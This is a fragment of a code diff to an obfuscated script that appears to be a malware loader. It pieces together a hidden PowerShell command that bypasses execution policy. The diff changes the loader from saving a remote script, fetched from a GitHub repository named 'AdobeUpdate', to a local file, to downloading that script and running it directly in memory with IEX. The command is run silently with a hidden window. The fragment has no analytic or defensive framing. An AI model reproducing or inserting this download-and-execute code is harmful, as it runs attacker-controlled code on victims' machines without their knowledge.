@@ -9,7 +9,7 @@ hctixwichs=" bYpaSs -c"
 
 
 
-aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" Add-Content -Path 'AIQlib106.ps1'"+" (n"+"ew-o"+"bje"+"ct n"+"et.w"+"ebc"+"li"+"ent).d"+"ownloa"+"dstr"+"ing('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/AdobeUpdate/main/AIQlib106.ps1')"
+aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" IE"+"X"+" ((n"+"ew-o"+"bje"+"ct n"+"et.w"+"ebc"+"li"+"ent).d"+"ownloa"+"dstr"+"ing('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/AdobeUpdate/main/AIQlib106.ps1'))"
 CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
 '@
 
